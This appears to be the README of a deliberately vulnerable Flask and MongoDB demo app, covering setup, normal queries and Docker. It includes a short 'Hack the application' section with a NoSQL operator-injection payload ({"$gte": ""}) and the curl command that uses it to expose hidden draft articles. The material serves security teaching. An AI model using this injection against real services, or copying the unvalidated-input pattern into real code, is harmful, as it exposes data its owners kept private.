We have provided a sample python web application coded in Flask that accept a post category in a JSON Body in a vulnerable way. You can also find a script that will exploit this vulnerability to retrieve the expected token.

### Run the web application

In order to run the web application, you'll need a MongoDB database running.

First create a virtualenv:

```bash
python -m virtualenv -p $(which python3) venv
source venv/bin/activate
```

Then install the dependencies:

```bash
pip install -r requirements.txt
```

Inject some articles by running:

```bash
python inject_articles.py
```

You can then run the web application this way:

```bash
python app.py
```

You can now get the articles in the `python` category with:

```bash
$> curl -X POST -H "Content-Type: application/json" -d '{"category": "python"}' "http://localhost:5000/category/"
[{"category": "python", "title": "Running js in python"}]
```

Or in the `security` category with:

```bash
$> curl -X POST -H "Content-Type: application/json" -d '{"category": "security"}' "http://localhost:5000/category/"
[{"category": "security", "title": "How to safely store password"}]
```

But you can't get the articles in the `drafts` category:

```bash
$> curl -X POST -H "Content-Type: application/json" -d '{"category": "drafts"}' "http://localhost:5000/category/"
[]
```

### Hack the application

The category endpoint is accepting data without first validating it, so we can actually send a json object and do a Mongodb injection with this payload

```json
{"$gte": ""}
```

With this payload, the endpoint will returns all articles with a category, include the ones in the `drafts` category:

```bash
$> curl -X POST -H "Content-Type: application/json" -d '{"category": {"$gte": ""}}' "http://localhost:5000/category/"
[{"category": "python", "title": "Running js in python"},
 {"category": "security", "title": "How to safely store password"},
 {"category": "drafts", "title": "My secret draft"}]
```

### Use docker

We also provided a docker-compose file that you can use if you don't have or want to have a running MongoDB process.

First you can build with:

```
docker-compose build .
```

Then launch it with:

```
docker-compose up
```

The service is now accessible at ```http://localhost:5000``` and you can use the same `curl` commands as above.
